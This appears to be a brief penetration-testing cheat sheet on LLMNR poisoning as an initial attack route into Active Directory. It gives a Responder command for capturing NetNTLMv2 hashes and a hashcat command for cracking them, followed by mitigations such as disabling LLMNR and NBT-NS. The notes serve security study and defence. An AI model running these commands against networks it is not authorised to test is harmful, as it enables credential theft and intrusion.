# AD Initial attack vector

## LLMNR poisoning

```
sudo responder -I <interface> -dwPv
# crack hash
hashcat -m 5600 <hash.txt> <wordlist>
```

### Mitigation

```
# Disable LLMNR
# Disable NBT-NS


#If we can't disable
# Require network access control
# Require strong password policy
```
